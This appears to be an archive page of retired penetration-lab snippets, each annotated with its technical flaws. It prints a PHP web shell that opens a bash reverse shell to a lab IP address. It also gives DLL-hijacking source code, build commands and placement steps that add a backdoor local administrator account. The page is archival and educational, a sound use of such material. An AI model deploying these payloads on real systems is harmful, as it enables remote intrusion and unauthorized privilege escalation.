# Retired lab snippets

[Home](../../README.md) · [Command archive](commands.md)

These snippets are retained for attribution and historical comparison, not as current procedures. Their original weaknesses are described beside the source. No success or cross-version compatibility is claimed. Prefer the current workflow and minimal proof.

## PHP shell example

The following original line is defective when the intermediate `/bin/sh` does not support its Bash-specific redirection. It can fail before Bash receives the intended command. Do not diagnose that syntax failure as a network failure. [PHP shell_exec](https://www.php.net/manual/en/function.shell-exec.php), [popen shell semantics](https://man7.org/linux/man-pages/man3/popen.3.html).

```text
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
```

## DLL account creation example

The original example below performs `system()` inside `DllMain`, changes local account/group state, assumes an English group name and does not check command results. It can block or destabilize the loader. This is not the recommended proof of a DLL load or elevated identity. [Microsoft DLL best practices](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices).

<details>
<summary>Original lab source retained for comparison</summary>

### Original account-creation source
1. Create DLL with name file.cpp
2. Convert file to .cpp to .dll, executable DLL using "x86_64-w64-mingw32-gcc".
3. Place DLL on the target, with same name as missing (My case - BetaService)
4. restart or start the service
5. Original asserted outcome: account creation. No observed outcome or checked return values were provided.


```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
            i = system ("net user ashok password123! /add");
            i = system ("net localgroup administrators ashok /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
```bash
x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
```



</details>

Attribution is preserved in the [archive references](commands.md#references); the immutable baseline contains the original placement.
